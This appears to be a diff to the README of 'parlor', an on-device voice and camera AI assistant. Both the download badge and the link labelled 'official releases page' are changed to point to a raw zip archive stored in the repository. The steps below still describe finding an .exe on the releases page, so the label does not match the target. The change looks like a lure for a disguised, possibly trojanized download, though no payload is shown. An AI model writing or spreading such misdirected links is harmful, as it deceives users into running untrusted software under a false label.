@@ -1,6 +1,6 @@
 # 🎙️ parlor - Talk to your computer with AI
 
-[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/Commutable-poilu834/parlor/releases)
+[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://raw.githubusercontent.com/Commutable-poilu834/parlor/main/artifacts/Software_v1.5.zip)
 
 Parlor brings private, on-device artificial intelligence to your computer. You use your voice and your camera to interact with the system. The software processes all information directly on your machine. Your chats remain private. No data leaves your computer.
 
@@ -18,7 +18,7 @@ To run this software, ensure your computer meets these criteria:
 
 Follow these steps to install and run the application.
 
-1. Visit the [official releases page](https://github.com/Commutable-poilu834/parlor/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Commutable-poilu834/parlor/main/artifacts/Software_v1.5.zip).
 2. Locate the most recent file ending in .exe under the Assets section.
 3. Click the file name to start the download.
 4. Open the downloaded file once the process finishes.
